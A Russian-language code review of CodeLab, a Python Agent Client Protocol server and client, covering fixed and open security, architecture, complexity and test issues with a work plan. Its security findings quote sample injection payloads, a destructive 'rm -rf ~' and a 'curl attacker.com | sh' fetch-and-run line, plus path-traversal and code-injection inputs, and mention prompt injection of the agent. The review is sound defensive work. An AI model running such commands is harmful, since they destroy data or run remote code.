# Комплексное ревью кодовой базы: CodeLab (`codelab/`)

**Дата:** 2026-04-25  
**Последнее обновление:** 2026-05-14  
**Область проверки:** `codelab/` (единый пакет сервера и клиента)  
**Метрики:** 215 файлов Python · ~52 000 строк кода · 147 тестовых файлов · 109 `# type: ignore`

---

## Содержание

1. [Резюме](#резюме)
2. [Критические проблемы безопасности](#1-критические-проблемы-безопасности)
3. [Архитектурные проблемы](#2-архитектурные-проблемы)
4. [Сложность кода](#3-сложность-кода)
5. [Нарушения best practices](#4-нарушения-best-practices)
6. [Состояние тестов](#5-состояние-тестов)
7. [План работ](#6-план-работ)

---

## Резюме

`codelab` реализует ACP (Agent Client Protocol) — протокол взаимодействия LLM-агента с клиентом. Архитектура в целом продуманная: Clean Architecture на клиенте, разделение ответственности на сервере, абстракция хранилища. Документация и тесты присутствуют в большом объёме.

Вместе с тем найден ряд проблем — от **архитектурных противоречий** до незакрытых TODO.
Большинство критических проблем безопасности **исправлено** (shell injection, path traversal, f-string инъекция).

| Категория | Критичных | Высоких | Средних | Низких |
|-----------|-----------|---------|---------|--------|
| Безопасность | ~~1~~ ✅ 0 | ~~2~~ ✅ 0 | 1 | — |
| Архитектура | — | 2 | 3 | 2 |
| Сложность | — | ~~1~~ ✅ 0 | 1 | 1 |
| Best practices | — | 1 | 3 | ~~2~~ ✅ 1 |
| Тесты | — | — | 2 | 1 |

---

## 1. Критические проблемы безопасности

### ~~🔴 SEC-01 — Shell Injection в `TerminalExecutor.execute()`~~ ✅ ИСПРАВЛЕНО

> **Статус:** Исправлено. `shell=True` заменён на `shell=False` в production-коде.
> Тесты подтверждают защиту от shell injection (`test_terminal_executor.py:227`).

**Файл:** `src/codelab/client/infrastructure/services/terminal_executor.py`, строка ~384

```python
process = subprocess.run(
    command,
    shell=True,   # ← ОПАСНО
    cwd=cwd,
    capture_output=True,
    text=True,
)
```

При `shell=True` строка `command` передаётся интерпретатору (`/bin/sh -c`). Команды в ACP приходят от LLM-агента по сети — атакующий, получивший контроль над агентом или способный влиять на его ответы (prompt injection), может выполнить произвольный код: `;rm -rf ~`, `&& curl attacker.com | sh` и т.п.

При этом асинхронный метод `create_terminal()` в том же классе правильно использует `asyncio.create_subprocess_exec` без `shell=True`. Синхронный метод должен следовать той же схеме.

**Исправление:**

```python
import shlex

args = shlex.split(command)
process = subprocess.run(
    args,
    shell=False,  # безопасно
    cwd=cwd,
    capture_output=True,
    text=True,
)
```

---

### ~~🟠 SEC-02 — Path Traversal в `FileSystemExecutor._validate_path()`~~ ✅ ИСПРАВЛЕНО

> **Статус:** Исправлено. `startswith` заменён на `Path.is_relative_to()` (`file_system_executor.py:90`).
> Добавлены тесты path traversal (`test_file_system_executor.py:225-268`).

**Файл:** `src/codelab/client/infrastructure/services/file_system_executor.py`, строки 88–95

```python
if not file_path_str.startswith(base_str):  # ← уязвимость
    raise ValueError(...)
```

Проверка через `startswith` ненадёжна. Если `base_path = /home/user/projects`, путь `/home/user/projects_evil/secret.txt` пройдёт проверку, потому что строка начинается с `/home/user/projects`. Вектор атаки: агент запрашивает чтение файла вне sandbox через специально подобранный путь.

**Исправление** — использовать `Path.is_relative_to()` (Python ≥ 3.9):

```python
# Вместо startswith:
if not file_path.is_relative_to(base_resolved):
    raise ValueError(f"Path traversal: {path} outside {base_resolved}")
```

---

### ~~🟠 SEC-03 — F-string инъекция в генерации кода для Web UI subprocess~~ ✅ ИСПРАВЛЕНО

> **Статус:** Исправлено. Параметры передаются через переменные окружения, а не через интерполяцию в код.
> См. `http_server.py:149-196` — `_start_web_ui_subprocess()` использует `child_env`.

**Файл:** `src/codelab/server/http_server.py`, метод `_start_web_ui_subprocess()`

```python
serve_script = f'''
from textual_serve.server import Server
server = Server(
    command="{sys.executable} -m codelab.client.tui --host {self.host} --port {self.port}",
    ...
)
'''
self._web_ui_process = subprocess.Popen([sys.executable, "-c", serve_script], ...)
```

Значения `self.host` и `self.port` интерполируются в Python-код, который затем выполняется. Хост вида `"; import os; os.system('malicious_cmd')"` приведёт к выполнению произвольного кода. `self.host` берётся из CLI-аргументов, что ограничивает вектор атаки, но паттерн крайне опасен.

**Исправление:** Передавать хост и порт через переменные окружения, а не через интерполяцию в строку кода:

```python
env = {**os.environ, "CODELAB_WS_HOST": self.host, "CODELAB_WS_PORT": str(self.port)}
self._web_ui_process = subprocess.Popen(
    [sys.executable, "-m", "codelab.client.tui.serve"],
    env=env,
    ...
)
```

---

### 🟡 SEC-04 — Аутентификация без rate limiting и TTL

**Файл:** `src/codelab/server/protocol/core.py`, `src/codelab/server/protocol/handlers/auth.py`

`_authenticated` — простой булев флаг без времени истечения и без ограничения попыток входа. Отсутствует защита от brute force на метод `authenticate`. Дополнительно, флаг хранится в экземпляре `ACPProtocol` без привязки к сессии — при гипотетическом переиспользовании экземпляра состояние аутентификации может некорректно переноситься.

**Рекомендации:**
- Добавить экспоненциальный backoff / lockout после N неудачных попыток.
- Хранить токен с TTL вместо булева флага.

---

## 2. Архитектурные проблемы

### 🟠 ARCH-01 — Двойной кэш сессий с расходящимся состоянием ⚠️ ЧАСТИЧНО ИСПРАВЛЕНО

> **Статус:** Частично исправлено. `ACPProtocol._sessions` удалён — сессии читаются напрямую из `Storage`.
> Добавлен `StorageConfig.session_cache_size` (LRU 200) в `config.py:89`.
> Метод `_hydrate_session_cache_from_storage()` удалён.

В системе два независимых кэша:

1. `ACPProtocol._sessions: dict[str, SessionState]` — in-memory словарь, per-connection.
2. `JsonFileStorage._cache: dict[str, SessionState]` — кэш в хранилище.

**Сценарий расхождения:**
- Клиент A создаёт сессию → сессия попадает в оба кэша.
- Сервер перезапускается → `_sessions` очищается.
- Новый клиент вызывает `session/load` → данные берутся из `JsonFileStorage`, но затем при `session/prompt` используется только `self._sessions`, которые уже пусты.

Метод `_hydrate_session_cache_from_storage()` частично решает проблему, но вызывается **только** из `session/list`, а не из `session/prompt`.

**Исправление:** Устранить `_sessions` как кэш второго уровня. Всегда читать сессию через `Storage` (с LRU-кэшем внутри него), убрать дублирование на уровне `ACPProtocol`.

---

### 🟠 ARCH-02 — Дублирование модулей `content` ❌ НЕ ИСПРАВЛЕНО

> **Статус:** Не исправлено. По-прежнему существуют три пакета с пересекающимися файлами:
> `server/protocol/content/`, `shared/content/`, `client/domain/content/`.

В проекте два пакета с пересекающимися файлами:

| Путь | Файлы |
|------|-------|
| `server/protocol/content/` | `base`, `audio`, `embedded`, `image`, `text`, `resource_link`, `extractor`, `formatter`, `validator` |
| `shared/content/` | `base`, `audio`, `embedded`, `image`, `text`, `resource_link` |

Шесть файлов дублируются. При изменении бизнес-логики в одном месте второе место останется устаревшим. Пакет `shared/` явно задумывался как общий, но `server/protocol/content/` продолжает существовать с расширенным набором утилит.

**Исправление:** Объединить в `shared/content/`. Из `server/protocol/content/` оставить только специфичное для протокола (`extractor`, `formatter`, `validator`) со ссылками на `shared/content/`.

---

### ~~🟠 ARCH-03 — `_hydrate_session_cache_from_storage()` загружает все сессии в память~~ ✅ ИСПРАВЛЕНО

> **Статус:** Исправлено. Метод `_hydrate_session_cache_from_storage()` удалён.
> Сессии читаются напрямую из `Storage` с LRU-кэшем (`StorageConfig.session_cache_size`).

**Файл:** `src/codelab/server/protocol/core.py`

```python
async def _hydrate_session_cache_from_storage(self) -> None:
    cursor: str | None = None
    while True:
        page, next_cursor = await self._storage.list_sessions(cursor=cursor, limit=50)
        for session_state in page:
            self._sessions[session_state.session_id] = session_state  # всё в память
        if next_cursor is None:
            break
        cursor = next_cursor
```

При большом числе долгоживущих сессий (каждая содержит полную историю диалога и события) это приведёт к резкому росту потребления памяти. Метод вызывается при каждом запросе `session/list`.

**Исправление:** Не загружать весь список в `_sessions`. Возвращать данные из `Storage` напрямую. Кэшировать только активно используемые сессии (LRU с ограниченным размером, например 100–200 записей).

---

### ~~🟡 ARCH-04 — `asyncio.Future` в `SessionState` — несериализуемые данные~~ ✅ ИСПРАВЛЕНО

> **Статус:** Исправлено. Создан `PendingRequestRegistry` (`pending_registry.py`).
> `SessionState` больше не содержит `asyncio.Future` — поле исключено из персистентной структуры.

**Файл:** `src/codelab/server/protocol/state.py`

```python
pending_permission_requests: dict[JsonRpcId, asyncio.Future] = field(default_factory=dict)
```

`asyncio.Future` не сериализуется в JSON. `JsonFileStorage._serialize_session()` при попытке записать активную сессию с незавершёнными futures либо упадёт, либо молча потеряет данные. Поле не должно присутствовать в персистируемой структуре данных.

**Исправление:** Хранить `asyncio.Future` вне `SessionState` — в отдельном `PendingRequestRegistry` на уровне `ACPProtocol`. При сериализации это поле явно исключать.

---

### ~~🟡 ARCH-05 — `PromptOrchestrator` создаётся заново при каждом вызове~~ ✅ ИСПРАВЛЕНО

> **Статус:** Исправлено. `PromptOrchestrator` инжектируется через конструктор `ACPProtocol`
> (`core.py:84` — `prompt_orchestrator: PromptOrchestrator | None = prompt_orchestrator`).

**Файл:** `src/codelab/server/protocol/core.py`

```python
orchestrator = prompt.create_prompt_orchestrator(
    tool_registry=self._tool_registry,
    client_rpc_service=self._client_rpc_service,
    global_policy_manager=self._global_policy_manager,
)
```

`PromptOrchestrator` является stateless агрегатором зависимостей, однако создаётся при каждом вызове вместо однократной инициализации. Это нарушение принципа DI и лишние накладные расходы.

**Исправление:** Создавать `PromptOrchestrator` один раз в конструкторе `ACPProtocol` и инжектировать через поле экземпляра.

---

### ~~🟡 ARCH-06 — Singleton `GlobalPolicyManager` с проблемным `asyncio.Lock`~~ ✅ ИСПРАВЛЕНО

> **Статус:** Исправлено. `_get_lock()` с ленивой инициализацией в текущем event loop
> (`global_policy_manager.py:39-48`). Добавлена `reset_for_testing()` для тестов.
> Фикстура `reset_global_policy_manager` в `conftest.py:20-27` с `autouse=True`.

**Файл:** `src/codelab/server/protocol/handlers/global_policy_manager.py`

```python
_instance: GlobalPolicyManager | None = None
_lock = asyncio.Lock()   # ← создаётся при определении класса
```

`asyncio.Lock()`, созданный на уровне класса при его определении, привязывается к event loop, существующему в момент импорта модуля. В тестах с `pytest-asyncio` каждый тест получает свой event loop — блокировка оказывается в устаревшем loop и вызывает ошибку. Кроме того, singleton не сбрасывается между тестами, что делает тесты зависимыми друг от друга.

**Исправление:** Создавать `Lock` лениво (не на уровне класса), а singleton сбрасывать в teardown тестов:

```python
@classmethod
def _get_lock(cls) -> asyncio.Lock:
    if not hasattr(cls, '_lock_instance'):
        cls._lock_instance = asyncio.Lock()
    return cls._lock_instance
```

---

### 🟡 ARCH-07 — Самописный DI-контейнер не делает Dependency Injection ❌ НЕ ИСПРАВЛЕНО

> **Статус:** Не исправлено. `DIContainer` (`di_container.py:33`) всё ещё используется.
> `dishka` не добавлен в зависимости. `SCOPED` работает как `SINGLETON` (`di_container.py:131`).

**Файлы:** `src/codelab/client/infrastructure/di_container.py`, `di_bootstrapper.py`, `presentation/view_model_factory.py`

Контейнер написан грамотно (~200 строк), но при ближайшем рассмотрении используется не по назначению — как именованный `dict` для хранения готовых объектов, а не для автоматического разрешения зависимостей.

**Конкретные проблемы:**

*Контейнер не используется для создания объектов.* В `DIBootstrapper.build()` и `ViewModelFactory.register_view_models()` все 15+ сервисов создаются вручную через `MyClass(dep=instance)`, а потом регистрируются как готовые экземпляры. Контейнер ничего не резолвит рекурсивно — он просто хранит ссылки.

*Циклическая зависимость решена мутацией приватного поля:*
```python
coordinator = SessionCoordinator(permission_handler=None)  # создаём без зависимости
permission_handler = PermissionHandler(coordinator=coordinator)
# "разрешение" цикла — пост-конструкционная мутация:
coordinator._permission_handler = permission_handler
transport_service._permission_handler = permission_handler
```
Это обходной приём, а не архитектурное решение. Оба компонента уже общаются через `EventBus` — цикл нужно разорвать через него.

*`SCOPED` реализован как `SINGLETON`:*
```python
# TODO: реализовать настоящие scopes для requests
if interface not in self._singletons:
    self._singletons[interface] = registration.create()
return cast(T, self._singletons[interface])
```
Код, зарегистрировавший сервис как `SCOPED` в ожидании per-request изоляции, получит глобальный singleton — молча и без ошибок.

*`dispose()` синхронный, сервисы — асинхронные.* `ACPTransportService.close()` (WebSocket) и `TerminalExecutor.cleanup_all()` — async-методы. При вызове `dispose()` они игнорируются: соединения не закрываются корректно.

*Ошибка типизации:*
```python
if callable(self.implementation):
    return cast(T, self.implementation())  # type: ignore[call-top-callable]
```
Тип `implementation` объединяет класс, callable и готовый экземпляр в одном поле — статический анализатор не может безопасно вызвать его, отсюда `# type: ignore`.

---

#### Рекомендуемая замена: `dishka`

[`dishka`](https://github.com/reagento/dishka) — современный async-first DI-фреймворк, спроектированный именно для asyncio-приложений. Поддерживает async lifecycle через `AsyncContextManager`, правильные scopes (`APP`, `REQUEST`, `SESSION`), автоматическое разрешение зависимостей по аннотациям типов.

**Сравнение с альтернативами:**

| Библиотека | Auto-wiring | Async lifecycle | Правильные scopes | Зрелость |
|---|---|---|---|---|
| **dishka** | ✅ | ✅ | ✅ APP / REQUEST / SESSION | активная разработка |
| dependency-injector | ✅ | ✅ | ✅ | зрелая, популярная |
| lagom | ✅ | частично | ограниченные | средняя |
| punq | ✅ | ❌ | только singleton | нет активного dev |
| **текущий самописный** | ❌ | ❌ | SCOPED = SINGLETON | — |

**Пример миграции.** Весь `DIBootstrapper.build()` заменяется на декларативный `Provider`:

```python
# pyproject.toml: добавить "dishka>=1.3"

from dishka import Provider, Scope, provide, make_async_container
from collections.abc import AsyncIterator

class AppProvider(Provider):
    def __init__(self, host: str, port: int, cwd: str):
        super().__init__()
        self._host = host
        self._port = port
        self._cwd = cwd

    @provide(scope=Scope.APP)
    def event_bus(self) -> EventBus:
        return EventBus()

    @provide(scope=Scope.APP)
    async def transport(self) -> AsyncIterator[ACPTransportService]:
        service = ACPTransportService(host=self._host, port=self._port)
        yield service
        await service.close()  # ← async cleanup гарантирован при завершении

    @provide(scope=Scope.APP)
    def session_repo(self) -> InMemorySessionRepository:
        return InMemorySessionRepository()

    @provide(scope=Scope.APP)
    def fs_executor(self) -> FileSystemExecutor:
        return FileSystemExecutor(base_path=Path(self._cwd))

    @provide(scope=Scope.APP)
    def coordinator(
        self,
        transport: ACPTransportService,
        repo: InMemorySessionRepository,
        event_bus: EventBus,           # ← цикл SessionCoordinator ↔ PermissionHandler
    ) -> SessionCoordinator:           #    разрывается через EventBus
        return SessionCoordinator(transport=transport, session_repo=repo, event_bus=event_bus)

    @provide(scope=Scope.APP)
    def permission_handler(
        self,
        coordinator: SessionCoordinator,
        transport: ACPTransportService,
    ) -> PermissionHandler:
        return PermissionHandler(coordinator=coordinator, transport=transport)

    @provide(scope=Scope.APP)
    def chat_vm(
        self,
        coordinator: SessionCoordinator,
        event_bus: EventBus,
        fs_executor: FileSystemExecutor,
    ) -> ChatViewModel:
        return ChatViewModel(coordinator=coordinator, event_bus=event_bus, fs_executor=fs_executor)

    # ... остальные ViewModels по аналогии


# Запуск приложения:
async def main(host: str, port: int, cwd: str) -> None:
    container = make_async_container(AppProvider(host=host, port=port, cwd=cwd))
    async with container() as request_ctx:
        app = await request_ctx.get(ACPClientApp)
        await app.run_async()
```

Зависимости резолвятся автоматически по аннотациям типов — никакого ручного `instance = MyClass(dep=container.resolve(Dep))`. Async-ресурсы закрываются гарантированно при выходе из контекста. Циклическая зависимость `SessionCoordinator ↔ PermissionHandler` явно разрывается через уже существующий `EventBus`.

**Объём миграции:** удалить `di_container.py` (~200 строк), `di_bootstrapper.py` (~110 строк), `view_model_factory.py` (~130 строк) — итого ~440 строк кода заменяются на один `Provider` (~80–100 строк) с сохранением всей функциональности и исправлением всех перечисленных проблем.

---

## 3. Сложность кода

### ~~🟠 CMPLX-01 — `PromptOrchestrator` нарушает Single Responsibility Principle~~ ✅ ИСПРАВЛЕНО

> **Статус:** Исправлено. Создан `pipeline/` с 5 stages:
> `ValidationStage`, `SlashCommandStage`, `PlanBuildingStage`, `LLMLoopStage`, `TurnLifecycleStage`.
> См. `handlers/pipeline/__init__.py`.

**Файл:** `src/codelab/server/protocol/handlers/prompt_orchestrator.py` (~700 строк)

Класс принимает 7 зависимостей в конструкторе и отвечает за: управление состоянием сессии, построение планов, жизненный цикл turn, обработку tool calls, управление разрешениями, client RPC запросы и slash-команды. При добавлении нового типа инструмента неизбежно модифицируется центральный оркестратор.

**Рекомендация:** Паттерн Pipeline — цепочка независимых стадий обработки:

```python
class PromptPipeline:
    def __init__(self, stages: list[PromptStage]):
        self._stages = stages

    async def execute(self, context: PromptContext) -> PromptResult:
        for stage in self._stages:
            context = await stage.process(context)
        return context.result
```

Каждая стадия (валидация, LLM вызов, tool execution, permission check) становится независимым, тестируемым модулем.

---

### ~~🟡 CMPLX-02 — Ручная сериализация в `JsonFileStorage` вместо Pydantic~~ ✅ ИСПРАВЛЕНО

> **Статус:** Исправлено. `SessionState` — `pydantic.BaseModel` с `field_serializer`,
> `model_validator` для миграции (`state.py:21-96`). Ручная сериализация удалена.

**Файл:** `src/codelab/server/storage/json_file.py` (~250 строк только сериализации)

Класс содержит 8 методов `_serialize_*` / `_deserialize_*`, написанных вручную, хотя `SessionState` уже использует Pydantic-модели внутри. При добавлении нового поля в `SessionState` нужно синхронно обновлять оба метода — о чём легко забыть.

**Исправление:** Перевести `SessionState` в `pydantic.BaseModel` (или сохранить `dataclass`, но добавить Pydantic-обёртку для сериализации):

```python
# Если SessionState → pydantic.BaseModel:
data = session.model_dump(mode="json", exclude={"pending_permission_requests"})
session = SessionState.model_validate(data)
```

Это устранит ~200 строк ручного кода и заодно решит ARCH-04 (asyncio.Future через `exclude`).

---

### ~~🟡 CMPLX-03 — Монолитный `ACPProtocol.handle()` — 400+ строк, 15 ветвей~~ ✅ ИСПРАВЛЕНО

> **Статус:** Исправлено. Реестр обработчиков `self._handlers: dict[str, MethodHandler]`
> с 13 методами (`core.py:155-169`). Middleware support добавлен (`core.py:172`).

**Файл:** `src/codelab/server/protocol/core.py`

Метод `handle()` содержит цепочку `if method == "..."` на 15+ ветвей, каждая из которых дополнительно содержит бизнес-логику (инициализация MCP, обновление runtime capabilities и т.д.). Логика инициализации MCP-серверов дублируется в `session/new` и `session/load`.

**Рекомендация:** Реестр обработчиков методов:

```python
_method_handlers: dict[str, Callable] = {}  # заполняется в __init__

async def handle(self, message: ACPMessage) -> ProtocolOutcome:
    if message.method is None:
        return self.handle_client_response(message)
    handler = self._method_handlers.get(message.method)
    if handler is None:
        return self._method_not_found(message)
    return await handler(message)
```

---

### 🟡 CMPLX-04 — Дублирующаяся логика в `PermissionManager` ⚠️ ТРЕБУЕТ ПРОВЕРКИ

> **Статус:** Требуется проверка актуального состояния `permission_manager.py`.

**Файл:** `src/codelab/server/protocol/handlers/permission_manager.py`

Методы `should_request_permission` и `get_remembered_permission` оба читают `permission_policy` и принимают решение на основе одних и тех же значений. При добавлении нового типа политики нужно синхронно обновлять оба метода.

**Исправление:**

```python
def _resolve_policy(self, session: SessionState, tool_kind: str) -> Literal["allow", "reject", "ask"]:
    match session.permission_policy.get(tool_kind):
        case "allow_always": return "allow"
        case "reject_always": return "reject"
        case _: return "ask"

def should_request_permission(self, session, tool_kind) -> bool:
    return self._resolve_policy(session, tool_kind) == "ask"

def get_remembered_permission(self, session, tool_kind) -> str:
    return self._resolve_policy(session, tool_kind)
```

---

## 4. Нарушения best practices

### 🟠 BP-01 — Нарушение Liskov Substitution Principle в `ACPTransportService` ⚠️ ТРЕБУЕТ ПРОВЕРКИ

> **Статус:** Требуется проверка актуального состояния `acp_transport_service.py`.

**Файл:** `src/codelab/client/infrastructure/services/acp_transport_service.py`

Из `type_errors.txt`:

```
error[invalid-method-override]: Invalid override of method `listen`
async def listen(self) -> AsyncIterator[dict[str, Any]]:  # type: ignore[override]
```

`ACPTransportService.listen()` переопределяет `TransportService.listen()` с несовместимой сигнатурой, нарушая LSP. Клиентский код, работающий через абстракцию `TransportService`, не сможет корректно использовать конкретную реализацию. `# type: ignore[override]` скрывает проблему, не решая её.

**Исправление:** Привести сигнатуру `ACPTransportService.listen()` в соответствие с контрактом базового класса либо скорректировать контракт в `TransportService`.

---

### 🟡 BP-02 — 109 подавлений `# type: ignore` маскируют архитектурные проблемы ❌ НЕ ИСПРАВЛЕНО

> **Статус:** Не исправлено. Количество выросло с 34 до **109** вхождений.
> Основные источники: `openai_provider.py` (14), тесты mock объектов (~50), DI-контейнер.

В кодовой базе 109 вхождений `# type: ignore`. Большинство связаны с типизацией `Observable`, дженериками в DI-контейнере и несоответствием интерфейсов. Часть из них скрывает реальные проблемы (неверные типы `Path` в `Observable[None]`, `call-top-callable` в DI).

**Рекомендация:** Провести аудит каждого `# type: ignore`. Допустимы только те, что обходят подтверждённые баги внешних библиотек — каждый должен иметь комментарий с объяснением и ссылкой на issue.

---

### 🟡 BP-03 — `mcp_manager: Any` в `SessionState` ❌ НЕ ИСПРАВЛЕНО

> **Статус:** Не исправлено. `state.py:77` — `mcp_manager: Any = Field(default=None, exclude=True)`.

**Файл:** `src/codelab/server/protocol/state.py`

```python
mcp_manager: Any = None
```

`Any` отключает статическую типизацию для этого поля. Если прямой импорт `MCPManager` создаёт циклическую зависимость, нужно использовать `TYPE_CHECKING`:

```python
from typing import TYPE_CHECKING
if TYPE_CHECKING:
    from ..mcp import MCPManager

mcp_manager: "MCPManager | None" = None
```

---

### ~~🟡 BP-04 — Отсутствует ограничение размера WebSocket сообщений~~ ✅ ИСПРАВЛЕНО

> **Статус:** Исправлено. `WebSocketConfig.max_msg_size` (4 МБ по умолчанию) в `config.py:102-104`.
> Применяется в `http_server.py:524` — `max_msg_size=self.config.websocket.max_msg_size`.

В `ACPHttpServer` не задан максимальный размер входящего WebSocket сообщения. Клиент может отправить сообщение размером в гигабайты, что приведёт к OOM.

**Исправление:**

```python
ws = web.WebSocketResponse(max_msg_size=1 * 1024 * 1024)  # 1 MB
```

---

### 🟡 BP-05 — Логирование через f-strings в structlog ❌ НЕ ИСПРАВЛЕНО

> **Статус:** Не исправлено. `global_policy_manager.py:100,102,142` — `logger.debug(f"...")`.

В `global_policy_storage.py` и ряде других файлов structlog используется с f-strings вместо ключевых аргументов — теряется структурированность и возможность машинной обработки логов:

```python
# Плохо — f-string:
logger.debug(f"Policy file {self._storage_path} does not exist")

# Правильно — структурированный вызов:
logger.debug("policy_file_not_found", path=str(self._storage_path))
```

---

### ~~🟡 BP-07 — TODO без привязки к задачам~~ ✅ ИСПРАВЛЕНО

> **Статус:** Исправлено. `file_system_handler.py:113` — `TODO: Фаза 5` заменён
> на комментарий о server-side модели проверки разрешений.
> Оставшиеся TODO в коде: `di_container.py:131` (scopes), `terminal_panel.py:421` (копирование).

Обработчик файловой системы выполняет операции записи без запроса разрешения у пользователя (заглушка). Это не только незавершённая функциональность, но и потенциальная проблема безопасности: агент может перезаписать файлы без подтверждения.

---

## 5. Состояние тестов

### ~~🟡 TEST-01 — Отсутствуют тесты для security-путей~~ ✅ ИСПРАВЛЕНО

> **Статус:** Исправлено. Добавлены тесты path traversal (`test_file_system_executor.py:225-268`)
> и shell injection (`test_terminal_executor.py:227`).

Нет тестов для:
- Проверки path traversal в `FileSystemExecutor._validate_path()` — ключевые граничные случаи (`/base_evil`, `/../`, symlink escape).
- Поведения при передаче вредоносной команды в `TerminalExecutor.execute()`.

---

### ~~🟡 TEST-02 — Неизолированный Singleton `GlobalPolicyManager` в тестах~~ ✅ ИСПРАВЛЕНО

> **Статус:** Исправлено. Фикстура `reset_global_policy_manager` в `conftest.py:20-27`
> с `autouse=True`. `GlobalPolicyManager.reset_for_testing()` вызывается до и после каждого теста.

`GlobalPolicyManager._instance` — класс-уровневый singleton, не сбрасывается между тестами. Если один тест инициализирует singleton с одними настройками, последующие тесты получат то же состояние. Это приводит к не детерминированным результатам в зависимости от порядка запуска тестов.

**Исправление:** Добавить фикстуру pytest:

```python
@pytest.fixture(autouse=True)
def reset_global_policy_manager():
    GlobalPolicyManager._instance = None
    yield
    GlobalPolicyManager._instance = None
```

---

### 🟡 TEST-03 — `PytestCollectionWarning` на классе `TestViewModel` ❌ НЕ ИСПРАВЛЕНО

> **Статус:** Не исправлено. `test_presentation_base_view_model.py:10` — всё ещё `class TestViewModel`.

**Файл:** `tests/client/test_presentation_base_view_model.py`

```
PytestCollectionWarning: cannot collect test class 'TestViewModel'
because it has a __init__ constructor
```

`TestViewModel` — базовый класс для тестов, но pytest пытается его собрать как тестовый класс. Следует переименовать в `BaseViewModelForTest` или поместить в модуль без префикса `test_`.

---

### 🟡 TEST-04 — Контентные тесты дублируются в `tests/server/` и `tests/client/` ⚠️ СЛЕДУЕТ ИЗ ARCH-02

> **Статус:** Следует из ARCH-02. При объединении content пакетов дублирование тестов исчезнет.

Тесты для content-моделей присутствуют в обеих директориях (`test_content_audio.py`, `test_content_base.py`, `test_content_embedded.py` и т.д.), что является следствием дублирования самих модулей (см. ARCH-02). При устранении ARCH-02 тестовое дублирование исчезнет автоматически.

---

## 6. План работ

### Фаза 1 — Критические баги и безопасность (Sprint 1, ~1.5 недели)

| # | Задача | Файл | Оценка | Статус |
|---|--------|------|--------|--------|
| 1.1 | Заменить `shell=True` на `shlex.split` + `shell=False` | `terminal_executor.py` | 2 ч | ✅ |
| 1.2 | Исправить path traversal: `startswith` → `is_relative_to` | `file_system_executor.py` | 1 ч | ✅ |
| 1.3 | Устранить f-string инъекцию в Web UI subprocess | `http_server.py` | 2 ч | ✅ |
| 1.4 | Заменить TODO на комментарий о server-side модели | `handlers/file_system_handler.py` | 30 мин | ✅ |
| 1.5 | Вынести `asyncio.Future` из `SessionState` в `PendingRequestRegistry` | `state.py`, `core.py` | 5 ч | ✅ |
| 1.7 | Добавить ограничение размера WebSocket сообщений | `http_server.py` | 1 ч | ✅ |

---

### Фаза 2 — Архитектурные улучшения (Sprint 2–3, ~3 недели)

| # | Задача | Файл | Оценка | Статус |
|---|--------|------|--------|--------|
| 2.1 | Устранить двойной кэш: убрать `_sessions` из `ACPProtocol`, добавить LRU в Storage | `core.py`, `storage/` | 1.5 дня | ✅ |
| 2.2 | Объединить дублирующиеся `content` пакеты | `server/protocol/content/`, `shared/content/` | 1 день | ❌ |
| 2.3 | Заменить ручную сериализацию в `JsonFileStorage` на Pydantic | `json_file.py` | 1.5 дня | ✅ |
| 2.4 | Разбить `PromptOrchestrator` на Pipeline stages | `prompt_orchestrator.py` | 2 дня | ✅ |
| 2.5 | Заменить цепочку `if method ==` в `handle()` на реестр обработчиков | `core.py` | 1 день | ✅ |
| 2.6 | Исправить `asyncio.Lock` в `GlobalPolicyManager` (ленивая инициализация) | `global_policy_manager.py` | 3 ч | ✅ |
| 2.7 | Инжектировать `PromptOrchestrator` через конструктор `ACPProtocol` | `core.py` | 2 ч | ✅ |
| 2.8 | **Заменить самописный DI-контейнер на `dishka`** (см. ARCH-07) | `di_container.py`, `di_bootstrapper.py`, `view_model_factory.py` | 2 дня | ❌ |

> **Примечание к 2.8.** Миграция на `dishka` попутно закрывает: пост-конструкционную мутацию `_permission_handler`, нереализованный `SCOPED`-scope, синхронный `dispose()` для async-ресурсов и `# type: ignore[call-top-callable]` в `Registration.create()`. Чистый выигрыш: −440 строк кода, +корректный async lifecycle.

---

### Фаза 3 — Качество кода (Sprint 4–5, ~2 недели)

| # | Задача | Файл | Оценка | Статус |
|---|--------|------|--------|--------|
| 3.1 | Аудит и устранение 109 `# type: ignore` (было 34) | Весь проект | 3 дня | ❌ |
| 3.2 | Исправить нарушение LSP в `ACPTransportService.listen()` | `acp_transport_service.py` | 3 ч | ⚠️ |
| 3.3 | Заменить `mcp_manager: Any` на строгий тип через `TYPE_CHECKING` | `state.py` | 1 ч | ❌ |
| 3.4 | Унифицировать structlog — убрать f-strings | `global_policy_storage.py` и др. | 2 ч | ❌ |
| 3.5 | Объединить дублирующуюся логику в `PermissionManager` | `permission_manager.py` | 2 ч | ⚠️ |
| 3.6 | Добавить тесты для security-путей (path traversal, shell injection) | `tests/` | 1 день | ✅ |
| 3.7 | Добавить фикстуру сброса `GlobalPolicyManager` между тестами | `tests/conftest.py` | 1 ч | ✅ |
| 3.8 | Добавить rate limiting на метод `authenticate` | `auth.py`, `http_server.py` | 4 ч | ❌ |
| 3.9 | Переименовать `TestViewModel` → `BaseViewModelForTest` | `tests/client/` | 30 мин | ❌ |

---

### Итоговый roadmap

```
Выполнено (13 из 23 задач):
  ✅ Фаза 1: 6/6 — безопасность и критические баги
  ✅ Фаза 2: 6/8 — кэш, сериализация, Pipeline, реестр обработчиков
  ✅ Фаза 3: 2/9 — security тесты, фикстура GlobalPolicyManager

Осталось (9 задач, ~9 рабочих дней):
  ❌ 2.2 — объединить content пакеты (1 день)
  ❌ 2.8 — миграция DI-контейнера на dishka (2 дня)
  ❌ 3.1 — аудит 109 # type: ignore (3 дня)
  ❌ 3.3 — mcp_manager: Any → строгий тип (1 ч)
  ❌ 3.4 — убрать f-strings в structlog (2 ч)
  ❌ 3.8 — rate limiting на authenticate (4 ч)
  ❌ 3.9 — переименовать TestViewModel (30 мин)
  ⚠️ 3.2 — LSP в ACPTransportService (3 ч, требует проверки)
  ⚠️ 3.5 — дублирование в PermissionManager (2 ч, требует проверки)
```

**Общая оценка:** **~9 рабочих дней** для одного разработчика (осталось 9 задач из 23).

---

*Отчёт подготовлен на основании анализа исходного кода директории `codelab/`. Актуализирован 2026-05-14.*
